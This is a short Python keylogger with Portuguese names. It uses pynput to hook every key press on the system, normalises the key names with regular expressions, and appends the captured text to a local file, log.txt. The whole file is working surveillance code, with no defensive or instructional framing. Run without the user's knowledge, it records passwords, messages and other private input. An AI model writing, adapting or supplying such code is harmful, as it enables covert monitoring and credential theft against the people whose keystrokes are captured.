from pynput.keyboard import Listener
import re


arquivoLog = 'log.txt'

def capturar(tecla):
    tecla = str(tecla)
    tecla = re.sub(r'\'','', tecla)
    tecla = re.sub(r'Key.space',' ', tecla)
    tecla = re.sub(r'Key.enter','\n', tecla) 
    tecla = re.sub(r'Key.ctrl_l','', tecla)
    tecla = re.sub(r'shiftKey','', tecla)
    tecla = re.sub(r'tabKey','', tecla)
    tecla = re.sub(r'Key.down','', tecla)
    tecla = re.sub(r'Key.alt_lKey.tab','', tecla)
    tecla = re.sub(r'Key.alt_lKey','', tecla)
    tecla = re.sub(r'Key.backspace','', tecla)
    tecla = re.sub(r'Key.shift','', tecla)
    tecla = re.sub(r'Key.cmd','', tecla)
    tecla = re.sub(r'ç','ç', tecla)
    tecla = re.sub(r'<96>','0', tecla)
    tecla = re.sub(r'<97>','1', tecla)
    tecla = re.sub(r'<98>','2', tecla)
    tecla = re.sub(r'<99>','3', tecla)
    tecla = re.sub(r'<100>','4', tecla)
    tecla = re.sub(r'<101>','5', tecla)
    tecla = re.sub(r'<102>','6', tecla)
    tecla = re.sub(r'<103>','7', tecla)
    tecla = re.sub(r'<104>','8', tecla)
    tecla = re.sub(r'<105>','9', tecla)
    tecla = re.sub(r'key.*','', tecla)
    
    with open(arquivoLog, "a") as log:
        log.write(tecla)    

with Listener(on_press=capturar) as log:
    log.join()